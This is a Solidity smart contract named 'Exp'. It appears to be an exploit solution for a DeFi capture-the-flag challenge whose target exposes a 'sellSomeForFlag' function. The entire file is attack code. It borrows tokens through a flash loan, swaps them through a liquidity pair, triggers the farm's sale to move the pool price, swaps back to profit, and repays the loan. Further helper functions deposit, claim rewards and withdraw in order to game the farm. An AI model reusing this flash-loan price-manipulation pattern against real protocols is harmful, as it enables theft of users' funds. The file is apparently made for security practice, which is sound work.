pragma solidity ^0.8.12;

import "./library/SafeERC20.sol";
import "./library/SafeMath.sol";
import "./interface/ISimpleSwapPair.sol";
import "./interface/IERC20.sol";

interface IFarm {
    function sellSomeForFlag() external;
    function deposit(address, uint256) external;
    function claimRewards(address) external;
    function withdraw(address, uint256) external;
    function getUserAmount(address) external view returns (uint256);
}

interface IFlashLoan {
    function flashloan(uint256, bytes calldata) external;
}

contract Exp {
    using SafeERC20 for IERC20;
    using SafeMath for uint256;

    struct UserInfo {
        uint256 amount; // How many tokens got staked by user.
        uint256 rewardDebt; // Reward debt. See Explanation below.
    }

    address public tokenA;
    address public tokenB;
    address public swap;
    address public farm;
    address public floan;

    constructor(address _tokenA, address _tokenB, address _swap, address _farm, address _floan) public {
        tokenA = _tokenA;
        tokenB = _tokenB;
        swap = _swap;
        farm = _farm;
        floan = _floan;
    }

    function getAmountOut(uint256 amountAIn, uint256 reserveA, uint256 reserveB) public returns (uint256 amountOut) {
        uint256 numerator = amountAIn.mul(reserveB);
        uint256 denominator = reserveA.add(amountAIn);
        amountOut = numerator.div(denominator);
    }

    function flashLoanCall(address sender, IERC20 token, uint256 amountOut, bytes calldata data) public {
        uint256 amountA = IERC20(tokenA).balanceOf(address(this));
        IERC20(tokenA).safeTransfer(swap, amountA);
        (uint256 reserveA, uint256 reserveB) = ISimpleSwapPair(swap).getReserves();
        uint256 amountOut = getAmountOut(amountA, reserveA, reserveB);
        ISimpleSwapPair(swap).swap(0, amountOut, address(this), "");
        IFarm(farm).sellSomeForFlag();
        (uint256 reserveA1, uint256 reserveB1) = ISimpleSwapPair(swap).getReserves();
        uint256 amountB = IERC20(tokenB).balanceOf(address(this));
        uint256 amountOut1 = getAmountOut(amountB, reserveB1, reserveA1);
        IERC20(tokenB).transfer(swap, amountOut);
        ISimpleSwapPair(swap).swap(amountOut1, 0, address(this), "");
        IERC20(tokenA).transfer(sender, amountA);
    }

    function launch() public {
        uint256 amountOut = IERC20(tokenA).balanceOf(floan);
        IFlashLoan(floan).flashloan(amountOut, " ");
    }

    function deposit1() public {
        IERC20(tokenA).approve(farm, 1);
        IFarm(farm).deposit(tokenA, 1);
    }

    function deposit2() public {
        uint256 allHave = IERC20(tokenA).balanceOf(address(this));
        IERC20(tokenA).approve(farm, allHave);
        IFarm(farm).deposit(tokenA, allHave);
        IFarm(farm).claimRewards(tokenA);
    }

    function get_reward() public {
        IFarm(farm).claimRewards(tokenA);
    }

    function withdraw() public {
        uint256 allDeposit = IFarm(farm).getUserAmount(address(this));
        IFarm(farm).withdraw(tokenA, allDeposit);
    }
}
